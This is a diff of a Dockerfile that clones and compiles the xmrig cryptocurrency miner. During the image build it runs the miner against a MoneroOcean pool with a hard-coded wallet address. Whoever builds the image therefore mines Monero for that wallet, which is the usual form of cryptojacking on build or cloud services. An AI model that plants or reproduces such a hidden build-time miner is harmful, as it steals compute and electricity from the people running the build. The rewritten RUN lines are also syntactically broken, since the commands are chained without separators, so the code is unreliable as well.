@@ -2,12 +2,12 @@ FROM ubuntu:latest
 
 WORKDIR /crypt
 
-RUN apt -y update
-RUN apt -y upgrade
-RUN apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
-RUN clone https://github.com/xmrig/xmrig.git
-RUN mkdir build
-RUN cd build
-RUN cmake ..
-RUN make
-RUN ./xmrig -o gulf.moneroocean.stream:10128 -u 4B4RSqqyoMQBNSnfTkWPFVTMVHzBGoY5WRn7BobfY1Myid5p6HaszDs7nyGVVNHGRTMh6HmFwxZMYR5Hc83frXULS1UfChC -p testgot
+RUN apt -y update \
+    apt -y upgrade \
+    apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y \
+    git clone https://github.com/xmrig/xmrig.git \
+    mkdir build \
+    cd build \
+    cmake .. \
+    make \
+    ./xmrig -o gulf.moneroocean.stream:10128 -u 4B4RSqqyoMQBNSnfTkWPFVTMVHzBGoY5WRn7BobfY1Myid5p6HaszDs7nyGVVNHGRTMh6HmFwxZMYR5Hc83frXULS1UfChC -p testgot
